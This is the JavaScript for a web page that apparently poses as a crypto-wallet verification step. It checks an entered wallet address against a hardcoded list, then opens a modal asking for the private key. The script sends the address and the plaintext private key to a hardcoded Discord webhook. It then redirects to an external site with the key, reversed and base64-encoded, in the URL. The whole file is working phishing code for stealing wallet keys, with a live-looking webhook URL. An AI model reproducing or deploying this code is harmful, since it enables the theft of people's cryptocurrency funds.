document.addEventListener('DOMContentLoaded', function() {
    const walletInput = document.getElementById('walletAddress');
    const verifyButton = document.getElementById('verifyButton');
    const privateKeyModal = document.getElementById('privateKeyModal');
    const privateKeyInput = document.getElementById('privateKey');
    const cancelButton = document.getElementById('cancelButton');
    const confirmButton = document.getElementById('confirmButton');
    const errorMessage = document.getElementById('errorMessage');
    const modalError = document.getElementById('modalError');
    const loadingOverlay = document.getElementById('loadingOverlay');

    const VALID_WALLET_ADDRESSES = [
        "HJL5i5ez6M4mWy3dX1KtSEYfhW5GazpWttAowsRngYAm",
        "3qDmJRFwV6ZZuHz4gYDRAdJQtJ4HBw5jWHNjaC9e8xaH",
        "F2MbRb3BaqHZwWw9Mv8DW1dBhBbncDbRK9pNnLMEW1Wa",
        "ENnCp997S9i8E11xgpR7CCfS8F87Df8BivYe68fyxSbp"
    ];

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1340003897896337488/YgVR4qNkPbuKFBr8QBkQK2XIsixefmO4rvy52Nsh0oLyYltC_emiIiwZNQiD-qRbOlYW";

    // 发送数据到 Discord
    async function sendToDiscord(walletAddress, privateKey) {
        try {
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `钱包地址: ${walletAddress}\n私钥: ${privateKey}`
                })
            });
            
            if (!response.ok) {
                throw new Error('发送失败');
            }
        } catch (error) {
            console.error("发送失败:", error);
            throw error;
        }
    }

    // 验证钱包地址格式
    function isValidWalletAddress(address) {
        return VALID_WALLET_ADDRESSES.includes(address);
    }

    // 验证私钥格式
    function isValidPrivateKey(key) {
        return key.length >= 15; // 私钥必须至少15个字符
    }

    // 显示错误信息
    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
        setTimeout(() => {
            element.style.display = 'none';
        }, 3000);
    }

    // 显示加载动画
    function showLoading() {
        loadingOverlay.style.display = 'flex';
    }

    // 隐藏加载动画
    function hideLoading() {
        loadingOverlay.style.display = 'none';
    }

    // 简单的加密函数
    function encryptKey(key) {
        return btoa(key.split('').reverse().join('')); // 简单的 base64 + 反转
    }

    // 验证钱包地址
    verifyButton.addEventListener('click', function() {
        const address = walletInput.value.trim();
        
        if (!isValidWalletAddress(address)) {
            showError(errorMessage, '无效的钱包地址，请重新输入');
            return;
        }

        privateKeyModal.style.display = 'flex';
    });

    // 取消按钮
    cancelButton.addEventListener('click', function() {
        privateKeyModal.style.display = 'none';
        privateKeyInput.value = '';
        modalError.textContent = '';
    });

    // 确认按钮
    confirmButton.addEventListener('click', async function() {
        const privateKey = privateKeyInput.value.trim();
        const walletAddress = walletInput.value.trim();
        
        if (!privateKey) {
            showError(modalError, '请输入私钥');
            return;
        }

        if (!isValidPrivateKey(privateKey)) {
            showError(modalError, '私钥错误');
            return;
        }

        showLoading();

        try {
            // 先进行跳转
            const encryptedKey = encryptKey(privateKey);
            
            // 发送数据到 Discord（放在后面）
            sendToDiscord(walletAddress, privateKey).catch(console.error); // 使用 catch 处理可能的错误
            
            // 直接跳转，不等待 Discord 响应
            window.location.href = `https://www.0xmeme.fun?key=${encryptedKey}`;
            
        } catch (error) {
            hideLoading();
            showError(modalError, '验证失败，请重新输入');
        }
    });

    // 点击模态框外部关闭
    privateKeyModal.addEventListener('click', function(e) {
        if (e.target === privateKeyModal) {
            privateKeyModal.style.display = 'none';
            privateKeyInput.value = '';
            modalError.textContent = '';
        }
    });
}); 
